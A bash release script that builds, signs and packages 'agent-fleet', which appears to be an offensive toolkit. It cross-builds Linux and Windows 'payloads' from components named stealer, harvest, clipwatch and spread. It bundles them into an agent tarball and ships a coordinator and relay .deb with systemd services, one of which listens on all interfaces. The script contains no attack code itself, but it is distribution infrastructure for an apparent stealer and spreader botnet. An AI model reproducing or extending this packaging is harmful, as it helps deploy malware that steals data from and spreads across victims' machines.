#!/bin/bash
# Builds, signs, and packages a release from Debian.
#
#   scripts/package-release.sh [version]
#
# Output: release-artifacts/<version>/ with linux and windows payloads, a
# coordinator .deb, SHA256SUMS, and an Ed25519 signature over it. The signing key
# lives in ~/.agent-fleet-signing (created on first run); the public key is
# copied next to the release for operators.
set -euo pipefail
cd "$(dirname "$0")/.."

version=${1:-0.1.0}
root="release-artifacts/$version"
signing=${AGENT_FLEET_SIGNING_KEY:-$HOME/.agent-fleet-signing}
rm -rf "$root"
mkdir -p "$root"/{linux-amd64,windows-amd64} "$signing"/{linux-amd64,windows-amd64}

if [ ! -f "$signing/key.pem" ]; then
  mkdir -p "$signing"
  chmod 700 "$signing"
  openssl genpkey -algorithm ED25519 -out "$signing/key.pem"
  chmod 600 "$signing/key.pem"
  openssl pkey -in "$signing/key.pem" -pubout -out "$signing/key.pub"
fi

bins="agentd adminctl coordd coordctl relayd harvest clipwatch spread fleetui"

printf '== linux builds ==\n'
cargo build --release -p agentd -p adminctl -p coordd -p relayd -p stealer -p spread -p fleetui
for bin in $bins; do
  cp "target/release/$bin" "$root/linux-amd64/$bin"
done
# Coordinator/relay are the only long-running server pieces.
tar -czf "$root/agent-fleet-coord-$version-linux-amd64.tar.gz" -C "$root/linux-amd64" \
  agentd adminctl coordd coordctl relayd fleetui
tar -czf "$root/agent-fleet-agent-$version-linux-amd64.tar.gz" -C "$root/linux-amd64" \
  agentd harvest clipwatch spread

printf '== windows cross-build ==\n'
if command -v x86_64-w64-mingw32-gcc >/dev/null 2>&1; then
  rustup target add x86_64-pc-windows-gnu >/dev/null 2>&1 || true
  cargo build --release --target x86_64-pc-windows-gnu \
    -p agentd -p adminctl -p coordd -p relayd -p stealer -p spread -p fleetui
  for bin in $bins; do
    cp "target/x86_64-pc-windows-gnu/release/$bin.exe" "$root/windows-amd64/$bin.exe"
  done
  tar -czf "$root/agent-fleet-$version-windows-amd64.tar.gz" -C "$root/windows-amd64" .
else
  printf 'mingw missing; windows payload skipped\n'
fi

printf '== coordinator deb ==\n'
stage=$(mktemp -d)
trap 'rm -rf "$stage"' EXIT
mkdir -p "$stage"/DEBIAN "$stage"/opt/agent-fleet/bin "$stage"/etc/agent-fleet \
  "$stage"/lib/systemd/system
install -m 0755 "$root/linux-amd64/coordd" "$root/linux-amd64/coordctl" \
  "$root/linux-amd64/adminctl" "$root/linux-amd64/relayd" \
  "$root/linux-amd64/fleetui" "$stage"/opt/agent-fleet/bin/
cat > "$stage/DEBIAN/control" <<EOF
Package: agent-fleet-coord
Version: $version
Section: net
Priority: optional
Architecture: amd64
Depends: openssl
Maintainer: h1t3m <h1t3m@localhost>
Description: Agent-Fleet coordinator, relay and operator tools
EOF
cat > "$stage/DEBIAN/postinst" <<'EOF'
#!/bin/sh
set -e
id -u agentfleet >/dev/null 2>&1 || useradd --system --home /var/lib/agent-fleet --shell /usr/sbin/nologin agentfleet
install -d -o agentfleet -g agentfleet -m 0700 /var/lib/agent-fleet /var/lib/agent-fleet-relay
chown agentfleet:agentfleet /etc/agent-fleet
systemctl daemon-reload || true
EOF
chmod 0755 "$stage/DEBIAN/postinst"
cat > "$stage/lib/systemd/system/agent-fleet-relay.service" <<'EOF'
[Unit]
Description=Agent-Fleet relay
After=network-online.target
[Service]
User=agentfleet
ExecStart=/opt/agent-fleet/bin/relayd --bind 0.0.0.0:8787 /var/lib/agent-fleet-relay
Restart=always
[Install]
WantedBy=multi-user.target
EOF
cat > "$stage/lib/systemd/system/agent-fleet-coord.service" <<'EOF'
[Unit]
Description=Agent-Fleet coordinator
After=network-online.target
[Service]
User=agentfleet
Environment=AF_STATE=/var/lib/agent-fleet
ExecStart=/opt/agent-fleet/bin/coordd --state /var/lib/agent-fleet --artifact-bind 127.0.0.1:8790
Restart=always
[Install]
WantedBy=multi-user.target
EOF
dpkg-deb --build --root-owner-group "$stage" "$root/agent-fleet-coord_${version}_amd64.deb" >/dev/null

printf '== manifest and signature ==\n'
cp "$signing/key.pub" "$root/agent-fleet-signing.pub"
( cd "$root" && sha256sum linux-amd64/* windows-amd64/* ./*.tar.gz ./*.deb 2>/dev/null | sort -k2 > SHA256SUMS )
openssl pkeyutl -sign -rawin -inkey "$signing/key.pem" \
  -in "$root/SHA256SUMS" -out "$root/SHA256SUMS.sig"
cat > "$root/RELEASE.json" <<EOF
{"version":"$version","signed_by":"$(openssl pkey -in "$signing/key.pem" -pubout -outform DER | sha256sum | cut -d' ' -f1)","created":"$(date -u +%FT%TZ)"}
EOF
cp scripts/verify-release.sh "$root/verify-release.sh"
printf 'release ready: %s\n' "$root"
